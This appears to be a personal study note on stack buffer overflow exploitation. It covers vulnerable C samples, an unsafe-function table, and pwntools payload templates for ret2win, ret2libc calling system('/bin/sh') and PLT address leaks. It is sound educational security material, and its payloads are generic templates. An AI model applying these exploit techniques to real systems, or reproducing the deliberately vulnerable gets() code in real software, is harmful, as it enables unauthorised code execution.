Navigation: [[Binary Exploitation]]

---
# Introduction
A buffer overflow is a vulnerability that occurs when a program writes more data to a buffer than it can hold. This can lead to overwriting adjacent memory within the program, causing crashes or allow arbitrary code execution.

Here's an example of a vulnerable program:
```C
void vuln ()
{
  char buf[16];
  gets (buf); // gets() is considered unsafe since it doesn't check input length 
  return;
}

int main ()
{
  vuln ();
  return 0;
}
```

If we were to look at the assembly of a vulnerable program, 
```asm
section .text
    global main

vuln:
    push rbp
    mov rbp, rsp
    sub rsp, 16
    lea rdi, [rbp-16]
    call gets            ; vulnerable call
    leave
    ret

main:
    push rbp
    mov rbp, rsp
    call vuln
    mov eax, 0
    leave
    ret

```
# Table of Contents
1. List of Unsafe Functions
2. Basic Attacks
	1. Ret2Win
	2. Ret2Shellcode
3. ROP
	1. Basic ROP Chains
	2. Ret2LibC
4. Common Protections
	1. Canaries
	2. ASLR and PIE

# List of Unsafe Functions
Here's a list of functions that can be used for buffer overflows and their safer alternatives:

| **Unsafe Function** | **Use**                                   | **Why It's Unsafe**                                                        | **Safer Alternative**                            |
| ------------------- | ----------------------------------------- | -------------------------------------------------------------------------- | ------------------------------------------------ |
| `gets()`            | Reads an entire line from `stdin`.        | Does not limit the number of characters read, leading to buffer overflows. | `fgets()` with a specified size.                 |
| `scanf()`           | Reads formatted input.                    | `%s` reads strings without bounds checking.                                | Use `%ns` or `fgets()`.                          |
| `strcpy()`          | Copies a string to a destination buffer.  | No bounds checking, can overwrite adjacent memory.                         | `strncpy()` or `strlcpy()` (if available).       |
| `strcat()`          | Appends a string to another.              | No bounds checking, can cause buffer overflows.                            | `strncat()` or `strlcat()` (if available).       |
| `sprintf()`         | Writes formatted data to a buffer.        | No bounds checking, can overwrite adjacent memory.                         | `snprintf()` with a specified size.              |
| `strncpy()`         | Copies a string to a destination buffer.  | Can lead to non-null-terminated strings if size is incorrect.              | Calculate size carefully or use safer libraries. |
| `memcpy()`          | Copies memory from source to destination. | No bounds checking, leading to memory corruption.                          | Use `memmove()` with proper checks.              |
| `bcopy()`           | Copies memory from source to destination. | Similar to `memcpy()`, lacks bounds checking.                              | Use `memmove()` with proper checks.              |
| `read()`            | Reads raw data into a buffer.             | No bounds checking on the buffer size.                                     | Validate input size or use `pread()`.            |
| `getsockopt()`      | Gets socket options.                      | May overflow buffers if `optval` size is mismanaged.                       | Validate buffer size carefully.                  |
| `realpath()`        | Resolves a file path.                     | Writes resolved path into a buffer without bounds checking.                | Use with a dynamically allocated buffer.         |
# Basic Attacks
There's 2 main attacks for just classical overflows: ret2win and ret2shellcode. Our attack path for both is very similar:
1. Find buffer length
2. Overwrite return with address to jump to

In ret2win, we'll simply overwrite the return address with our win function.

In ret2shellcode, we'll be overwriting the buffer with our shellcode. We'll set our return address to the start of the buffer (which we'll have to leak out or calculate somehow). Note that this is only possible if the NX protection is disabled. 

Here's some sample C code that is vulnerable to both:
```c
void win ()
{
  printf ("You win\n");
  return;
}

void vuln ()
{
  char buf[256];
  gets (buf); // gets() is considered unsafe since it doesn't check input length 
  return;
}

int main ()
{
  vuln ();
  return 0;
}
```

Following the boilerplate from [[Common Tools, Useful Commands, and Boilerplate]], here's how we can generate payloads for each:
```python
buffer_len = 388 # this is random, go calculate it using pwndbg
io = start()

payload = flat (
		b'A' * buffer_len,
		elf.functions.win # return address
)

io.sendline(payload)
io.recvall()

# For ret2shellcode, we simply put our shellcode before the padding, then calculate the offset accordingly. The return address is then the top of the stack which should point to our shellcode.
```
# ROP
Here's the fun part. ROP consists of chaining different return addresses on the stack to make multiple calls. Our return addresses are called "gadgets", which are often small sets of two to three instructions at the end of functions.

Here's how we can find gadgets:
```
ROPGadget --binary=<file>
```

There's also the following tools:
https://scoding.de/ropper/
https://github.com/0vercl0k/rp

**Different ROP Techniques**:
1. Adding values to registers
2. Stack pivots
### Ret2LibC
Ret2LibC is a ROP exploit where we return to the `libc` executable on the system. The basic attack often goes as follows:
1. Find `libc` address (often by leaking it due to ASLR and PIE)
2. Calculate offsets for the string `/bin/sh` and function `system()`
3. Call `system('/bin/sh')`

Here's the payload section of a basic ret2libc attack:
```python
libc_base = 0x7ffff # base addr of libc
system = libc_base + system_offset
binsh = libc_base + binsh_offset

pop_rdi = 0x1000 # address of pop rdi gadget
padding = 78 # calculate this

payload = flat (
		asm('nop') * padding,
		pop_rdi,
		binsh, # pop binsh into rdi
		system # Call system('/bin/sh')
)
```

Note that we'll likely have to leak the addresses of libc as well as the PIE base (to find the `pop rdi` address correctly). 

To calculate the offset of libc functions, we need the libc version. Refer to [this](https://libc.blukat.me/). We can also do it manually using:
```shell
readelf -s libc.so.6 | grep execve
```

The ROP Arms Race was fueled by [this paper](https://doi.org/10.1145/1609956.160996). It spawned the following techniques:
1. B(lock)OP: ROP on a block (or multi-block) level by carefully compensating for side-effects.
2. J(ump)OP: instead of returns, use indirect jumps to control execution flow
3. C(all)OP: instead of returns, use indirect calls to control execution flow
4. S(ignreturn)ROP: instead of returns, use the sigreturn system call
5. D(ata)OP: instead of hijacking control flow, carefully overwrite the program's data to puppet it

# Common Protections
A canary is a value that's put on the stack to detect overflows. If it's changed, the stack check fails and the program exits. 

ASLR is a protection that randomizes system address spaces. For our purposes, it'll randomize the address of libc. PIE does this but for the running program itself. 

Bypassing canaries is as simple as either leaking the canary or brute forcing it byte by byte. I'm not going to go into detail of how to do the latter, however, the former follows the same idea as bypassing PIE and ASLR.

Ways to leak addresses:
1. [[Format String Vulnerabilities]]
2. PLT Leak
3. Over-read 

**PLT Leak**
If we have PLT and GOT, we can call puts with the GOT address of puts as an argument to get the libc base address. Here's how the payload for it would look:
```python
payload = flat (
	offset: [ # offset is the buffer len
		pop_rdi,
		elf.got.puts,
		elf.plt.puts
	]
)
```

**Over-read**
An over-read vulnerability is somewhat rare, but here's how it looks in source code:
```C
void vuln ()
{
	char str[16];
	gets (str); 
	printf ("%s", str);
}

int main ()
{
	vuln ();
	return 0;
}
```

The way that this can be exploited is by writing all 16 bytes of the string. This way, there's no null terminator for the string, and the printed value can leak information off of the stack. 

---
Navigation: [[Binary Exploitation]]